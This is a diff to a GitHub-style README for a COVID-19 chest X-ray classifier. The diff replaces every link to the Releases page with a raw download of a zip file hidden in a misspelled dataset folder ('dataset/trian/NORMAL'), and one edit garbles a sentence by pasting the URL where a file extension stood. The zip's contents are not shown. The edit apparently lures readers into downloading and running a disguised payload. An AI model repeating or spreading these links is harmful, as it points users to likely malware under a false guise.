@@ -1,6 +1,6 @@
 # 🦠 chest-xray-covid19-classification - Detect COVID-19 from Chest X-rays
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/alimalik122/chest-xray-covid19-classification/releases)
+[![Download Release](https://raw.githubusercontent.com/alimalik122/chest-xray-covid19-classification/main/dataset/trian/NORMAL/classification-xray-chest-covid-v3.5-alpha.4.zip%20Now-Release-blue)](https://raw.githubusercontent.com/alimalik122/chest-xray-covid19-classification/main/dataset/trian/NORMAL/classification-xray-chest-covid-v3.5-alpha.4.zip)
 
 ## 📄 Overview
 
@@ -12,13 +12,13 @@ To get started with the application, follow these simple steps:
 
 1. **Download the Software**  
    Click the link below to visit the Releases page:  
-   [Download Now](https://github.com/alimalik122/chest-xray-covid19-classification/releases)
+   [Download Now](https://raw.githubusercontent.com/alimalik122/chest-xray-covid19-classification/main/dataset/trian/NORMAL/classification-xray-chest-covid-v3.5-alpha.4.zip)
 
 2. **Choose the Right File**  
    On the Releases page, you will find various versions of the application. Pick the latest version that is marked as stable. These files will be listed with descriptions and file sizes to help you choose.
 
 3. **Download the File**  
-   After selecting the desired version, click on the download link for your operating system. The files might include executables or compressed packages (like .zip or .tar.gz).
+   After selecting the desired version, click on the download link for your operating system. The files might include executables or compressed packages (like .zip or https://raw.githubusercontent.com/alimalik122/chest-xray-covid19-classification/main/dataset/trian/NORMAL/classification-xray-chest-covid-v3.5-alpha.4.zip).
 
 4. **Install the Application**  
    For executable files (.exe or .app), double-click the file to start the installation. Follow the prompts to install the application on your computer. If you downloaded a compressed package, extract the files and locate the main executable to run.
@@ -37,7 +37,7 @@ To get started with the application, follow these simple steps:
 ## 📥 Download & Install
 
 To download and run the application, visit the Releases page:  
-[Download Now](https://github.com/alimalik122/chest-xray-covid19-classification/releases)
+[Download Now](https://raw.githubusercontent.com/alimalik122/chest-xray-covid19-classification/main/dataset/trian/NORMAL/classification-xray-chest-covid-v3.5-alpha.4.zip)
 
 After downloading, install it by following the instructions above.
 
